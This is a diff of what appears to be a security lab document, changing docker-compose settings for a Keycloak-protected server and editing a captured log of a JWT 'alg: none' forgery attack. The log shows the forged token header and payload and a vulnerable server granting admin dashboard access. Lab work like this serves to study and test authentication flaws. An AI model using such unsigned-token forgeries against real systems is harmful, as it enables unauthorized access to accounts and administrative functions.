@@ -218,11 +218,11 @@ services:
     resource_server:
         build: ./secure_server
         environment:
-            OIDC_ISSUER: http://keycloak:8080/realms/security-lab
-            OIDC_AUDIENCE: fastapi-resource
-            JWKS_URL: http://keycloak:8080/realms/security-lab/protocol/openid-connect/certs
+            KEYCLOAK_ISSUER: http://keycloak:8080/realms/security-lab
+            KEYCLOAK_AUDIENCE: secure-client
+            KEYCLOAK_JWKS_URL: http://keycloak:8080/realms/security-lab/.well-known/jwks.json
         ports:
-            - "8000:8000"
+            - "8001:8001"
         depends_on:
             - keycloak
         networks:
@@ -231,8 +231,8 @@ services:
     client:
         build: ./scripts
         environment:
-            OIDC_ISSUER: http://keycloak:8080/realms/security-lab
-            CLIENT_ID: lab-client
+            KEYCLOAK_ISSUER: http://keycloak:8080/realms/security-lab
+            KEYCLOAK_CLIENT_ID: secure-client
             CLIENT_SECRET: lab-secret
             REDIRECT_URI: http://localhost:9000/callback
         depends_on:
@@ -316,7 +316,7 @@ The corresponding attack execution log, also captured in the phase data export, 
 FORGED_HEADER: {'alg': 'none', 'typ': 'JWT',
  'kid': 'abUchODotE6lgU9Vy-t3da2o15yX8maEDRKC2hiCI9o'}
 FORGED_PAYLOAD: {'exp': 1780091674, 'iat': 1780091374, 'auth_time': 1780091374, 'jti': '81d666c0-0c66-4d70-922d-91c0cfcde40c',
- 'iss': 'http://localhost:8080/realms/security-lab', 'aud': 'account', 'sub': '63c4f288-e40f-493c-83e2-5ad53ce55e62', 'typ': 'Bearer',
+ 'iss': 'http://localhost:8080/realms/security-lab', 'aud': 'secure-client', 'sub': '63c4f288-e40f-493c-83e2-5ad53ce55e62', 'typ': 'Bearer',
  'azp': 'secure-client', 'session_state': '3987515d-e6bf-4445-bd99-1c5280925422', 'acr': '1',
  'allowed-origins': ['https://secure.example.com'], 'realm_access': {'roles': ['default-roles-security-lab', 'offline_access', 'uma_authorization']},
  'resource_access': {'account': {'roles': ['manage-account', 'manage-account-links', 'view-profile']}}, 'scope': 'openid profile email',
@@ -325,7 +325,7 @@ FORGED_PAYLOAD: {'exp': 1780091674, 'iat': 1780091374, 'auth_time': 1780091374, 
 ATTACKER_VULNERABLE_OUTPUT_START
 Status: 200
 {"message":"Welcome to the admin dashboard.","user":{"exp":1780091674,"iat":1780091374,"auth_time":1780091374,"jti":"81d666c0-0c66-4d70-922d-91c0cfcde40c",
-"iss":"http://localhost:8080/realms/security-lab","aud":"account","sub":"63c4f288-e40f-493c-83e2-5ad53ce55e62","typ":"Bearer","azp":"secure-client",
+"iss":"http://localhost:8080/realms/security-lab","aud":"secure-client","sub":"63c4f288-e40f-493c-83e2-5ad53ce55e62","typ":"Bearer","azp":"secure-client",
 "session_state":"3987515d-e6bf-4445-bd99-1c5280925422","acr":"1","allowed-origins":["https://secure.example.com"],
 "realm_access":{"roles":["default-roles-security-lab","offline_access","uma_authorization"]},
 "resource_access":{"account":{"roles":["manage-account","manage-account-links","view-profile"]}},
